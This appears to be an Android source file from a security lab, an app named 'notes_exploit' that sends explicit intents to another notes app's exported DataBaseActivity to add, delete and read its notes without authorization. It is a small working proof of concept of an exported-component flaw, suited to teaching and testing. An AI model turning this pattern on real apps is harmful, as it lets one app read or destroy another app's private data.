package tcs.lbs.notes_exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    EditText editText;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }


    public void addClicked(android.view.View view) {
        EditText editText = findViewById(R.id.add_editText);  // 使用明确的类型声明
        String noteText = editText.getText().toString().trim();  // 去除输入文本的前后空白

        if (noteText.isEmpty()) {
            Toast.makeText(this, "Please enter some text to add", Toast.LENGTH_SHORT).show();  // 检查文本是否为空，并给出提示
            return;
        }

        // 创建Intent并设置目标组件
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("tcs.lbs.notes", "tcs.lbs.notes.DataBaseActivity"));

        // 向Intent添加数据
        intent.putExtra("NOTE_TEXT", noteText);
        intent.putExtra("NOTE_ID", "NEW_ID");  // 此处NEW_ID作为常量更合适，避免硬编码
        intent.putExtra("ACTION_NAME", "SAVE_ITEM");

        // 启动DataBaseActivity并期待返回结果
        startActivityForResult(intent, 1);
    }


    public void removeClicked(android.view.View view) {
        EditText editText = findViewById(R.id.remove_editText);  // 使用明确的类型声明
        String noteId = editText.getText().toString().trim();  // 去除输入文本的前后空白

        if (noteId.isEmpty()) {
            Toast.makeText(this, "Please enter the note ID to remove", Toast.LENGTH_SHORT).show();  // 检查ID是否为空，并给出提示
            return;
        }

        // 创建Intent并设置目标组件
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("tcs.lbs.notes", "tcs.lbs.notes.DataBaseActivity"));

        // 向Intent添加数据
        intent.putExtra("NOTE_ID", noteId);
        intent.putExtra("ACTION_NAME", "DELETE_ITEM");

        // 启动DataBaseActivity并期待返回结果
        startActivityForResult(intent, 1);
    }


    public void showClicked(android.view.View view) {
        EditText editText = findViewById(R.id.show_editText);
        String noteId = editText.getText().toString().trim();

        if (noteId.isEmpty()) {
            Toast.makeText(this, "Please enter a note ID to show", Toast.LENGTH_SHORT).show();
            return;
        }

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("tcs.lbs.notes", "tcs.lbs.notes.DataBaseActivity"));
        intent.putExtra("NOTE_ID", noteId);
        intent.putExtra("ACTION_NAME", "GET_ITEM_TEXT");

        startActivityForResult(intent, 2); // 使用不同的请求码区分不同的操作
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 2 && resultCode == RESULT_OK) {
            String noteText = data.getStringExtra("ITEM_TEXT"); // 确保这个键与你在 DataBaseActivity 中设置的键匹配
            if (noteText != null) {
                Toast.makeText(this, noteText, Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "Note not found", Toast.LENGTH_SHORT).show();
            }
        }
    }

}

